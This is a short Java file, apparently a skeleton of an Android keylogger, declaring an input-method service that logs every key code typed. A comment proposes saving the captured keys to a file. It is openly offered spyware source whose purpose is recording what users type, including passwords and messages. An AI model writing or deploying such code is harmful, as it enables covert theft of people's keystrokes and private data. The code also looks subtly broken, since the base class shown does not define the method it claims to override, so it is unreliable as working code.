package com.example.keylogger;

import android.inputmethodservice.InputMethodService;
import android.util.Log;

public class KeyloggerInputMethodService extends InputMethodService {
    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        super.onKey(primaryCode, keyCodes);
        // Log captured key to console or save to file
        Log.d("Keylogger", "Key pressed: " + primaryCode);
    }
}
